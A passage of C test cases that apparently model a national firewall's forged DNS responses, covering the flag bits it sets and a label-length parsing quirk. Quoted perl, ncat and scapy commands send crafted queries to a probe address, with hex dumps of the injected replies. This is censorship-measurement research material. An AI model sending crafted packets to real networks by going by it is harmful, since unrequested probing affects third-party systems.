// Instead, that byte (which has value 'X', 88) is interpreted as a length
// prefix and a label of that length is appended to the name. The loop
// terminates at the *next* label length prefix after that.
/*
$ perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x08facebook\x04com\x00"' | sudo ../util/gfw-scapy.py --raw --ip 212.64.11.0 --udplen 35
*/
TEST_UDPLEN(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\x04" "com\x00", +1, false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\x04" "com\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),


/* FLAGS
All injected responses have the QR bit (0x8000) set. The rest of the response
flags depend on the RD bit ("recursion desired"; 0x0100) in the query:
  if RD == 0:
    set AA ("authoritative answer"; 0x0400)
  if RD == 1:
    set RD ("recursion desired"; 0x0100) and RA ("recursion available"; 0x0080)
All other bits in the response (Opcode, TC, Z, RCODE) are always unset.
In short, if the RD bit is unset in the query, the injection imitates an
authoritative response; if RD is set in the query, the injection imitates a
recursive response.
*/

// If the RD bit (0x0100) is not set in the query, the response sets the
// AA bit (0x0400).
/*
$ (perl -e 'print "\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x10org\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   12 34 00 00 00 01 00 00   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01                        .org.... .
[0000]   12 34 84 00 00 01 00 01   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01 AD E1 E3 E1 B2 F9 F5   .org.... ........
[0020]   3D 5A 46 04 6E 9D C0 0C   00 01 00 01 00 00 00 D3   =ZF.n... ........
[0030]   00 04 67 D6 A8 6A                                   ..g..j
*/
TEST(
	"\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01", false,
	"\x12\x34\x84\x00\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01" "XXXXXXXXXXXXX" A_SUFFIX
),
// If the RD bit (0x0100) is set in the query, the response sets the
// RD (0x0100) and RA (0x0080) bits.
/*
$ (perl -e 'print "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x10org\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   12 34 01 00 00 01 00 00   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01                        .org.... .
[0000]   12 34 81 80 00 01 00 01   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01 03 03 01 53 AA 16 79   .org.... ....S..y
[0020]   B5 D0 B1 81 AD D5 C0 0C   00 01 00 01 00 00 00 A4   ........ ........
[0030]   00 04 67 E6 7B BE                                   ..g.{.
*/
TEST(
	"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01", false,
	"\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01" "XXXXXXXXXXXXX" A_SUFFIX
),
// Setting all bits in a query other than QR (i.e., Opcode, AA, TC, RD, RA, Z,
// and RCODE) yields a response with only QR (0x8000), RD (0x0100), and
// RA (0x0080) set.
/*
$ (perl -e 'print "\x12\x34\x7f\xff\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x10org\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   12 34 7F FF 00 01 00 00   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01                        .org.... .
[0000]   12 34 81 80 00 01 00 01   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01 03 CB BA 91 84 46 8A   .org.... ......F.
[0020]   4A F4 AE E5 EB 8C C0 0C   00 01 00 01 00 00 00 FC   J....... ........
[0030]   00 04 27 6D 7A 80                                   ..'mz.
*/
TEST(
	"\x12\x34\x7f\xff\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01", false,
	"\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01" "XXXXXXXXXXXXX" A_SUFFIX
),
// Setting all bits in a query other than QR and RD (i.e., OPCODE, AA, TC, RA,
// Z, and RCODE) yields a response with only QR (0x8000) and AA (0x0400) set.
/*
$ (perl -e 'print "\x12\x34\x7e\xff\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x10org\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   12 34 7E FF 00 01 00 00   00 00 00 00 03 72 73 66   .4~..... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01                        .org.... .
[0000]   12 34 84 00 00 01 00 01   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01 99 DF C8 71 1F DF FF   .org.... ....q...
[0020]   F0 07 2D BE BC 21 C0 0C   00 01 00 01 00 00 00 E5   ..-..!.. ........
[0030]   00 04 1F 0D 46 09                                   ....F.
*/
TEST(
	"\x12\x34\x7e\xff\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01", false,
	"\x12\x34\x84\x00\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01" "XXXXXXXXXXXXX" A_SUFFIX
),
// Messages with QR=1 (indicating a response) never get an injection.
/*
$ (perl -e 'print "\x12\x34\x80\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x10org\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   12 34 80 00 00 01 00 00   00 00 00 00 03 72 73 66   .4...... .....rsf
[0010]   10 6F 72 67 00 00 01 00   01                        .org.... .
*/
TEST(
	"\x12\x34\x80\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x10" "org" "\x00\x00\x01\x00\x01", false,
	""
),
